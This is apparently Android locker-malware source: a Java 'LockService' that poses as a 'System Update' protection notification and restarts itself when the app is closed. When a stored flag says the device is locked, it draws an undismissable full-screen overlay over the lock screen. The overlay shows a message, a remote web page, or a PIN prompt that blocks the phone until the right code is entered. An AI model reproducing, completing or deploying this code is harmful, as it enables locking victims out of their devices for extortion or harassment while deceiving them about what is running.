package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.NotificationCompat;
import android.content.SharedPreferences;
import android.content.Context;

public class LockService extends Service {
    private WindowManager wm;
    private View overlay;
    private String lockType = "pin";
    private String lockData = "1234";
    private static final String CHANNEL_ID = "lock_service_channel";
    private static final int NOTIFICATION_ID = 999;
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundService();
        acquireWakeLock();
    }

    private void startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Security Service",
                NotificationManager.IMPORTANCE_HIGH
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update")
            .setContentText("Device is protected - Running in background")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setOngoing(true)
            .build();

        startForeground(NOTIFICATION_ID, notification);
    }

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "LockService::WakeLock");
        wakeLock.setReferenceCounted(false);
        wakeLock.acquire(10 * 60 * 1000L);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            lockType = intent.getStringExtra("lock_type");
            lockData = intent.getStringExtra("lock_data");
        }
        
        // ============ TAMBAHAN: CEK APAKAH SEDANG TERKUNCI ============
        SharedPreferences prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE);
        boolean isLocked = prefs.getBoolean("flutter.system_locked", false);
        
        if (isLocked) {
            showLockScreen();
        }
        // ============ AKHIR TAMBAHAN ============
        
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restartServiceIntent = new Intent(getApplicationContext(), LockService.class);
        restartServiceIntent.setPackage(getPackageName());
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartServiceIntent);
        } else {
            startService(restartServiceIntent);
        }
        super.onTaskRemoved(rootIntent);
    }

    private void showLockScreen() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            stopSelf();
            return;
        }
        
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        overlay = LayoutInflater.from(this).inflate(R.layout.lock_overlay, null);
        
        WebView webView = overlay.findViewById(R.id.webView);
        EditText etPin = overlay.findViewById(R.id.pinInput);
        Button btn = overlay.findViewById(R.id.unlockBtn);
        TextView tvText = overlay.findViewById(R.id.tvText);
        
        if ("html".equals(lockType) && lockData != null && !lockData.isEmpty()) {
            webView.setVisibility(View.VISIBLE);
            etPin.setVisibility(View.GONE);
            btn.setVisibility(View.GONE);
            tvText.setVisibility(View.GONE);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.setWebViewClient(new WebViewClient());
            webView.loadUrl(lockData);
        } else if ("text".equals(lockType) && lockData != null && !lockData.isEmpty()) {
            webView.setVisibility(View.GONE);
            etPin.setVisibility(View.GONE);
            btn.setVisibility(View.VISIBLE);
            tvText.setVisibility(View.VISIBLE);
            tvText.setText(lockData);
            btn.setOnClickListener(v -> stopSelf());
        } else {
            webView.setVisibility(View.GONE);
            etPin.setVisibility(View.VISIBLE);
            btn.setVisibility(View.VISIBLE);
            tvText.setVisibility(View.GONE);
            btn.setOnClickListener(v -> {
                if (etPin.getText().toString().equals(lockData)) {
                    stopSelf();
                } else {
                    Toast.makeText(this, "PIN salah!", Toast.LENGTH_SHORT).show();
                    etPin.setText("");
                }
            });
        }
        
        int flags = WindowManager.LayoutParams.FLAG_FULLSCREEN
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;
        
        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                WindowManager.LayoutParams.TYPE_PHONE;
        
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT, type, flags, PixelFormat.TRANSLUCENT);
        params.gravity = Gravity.CENTER;
        wm.addView(overlay, params);
    }

    @Override
    public void onDestroy() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        if (overlay != null && wm != null) {
            wm.removeView(overlay);
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}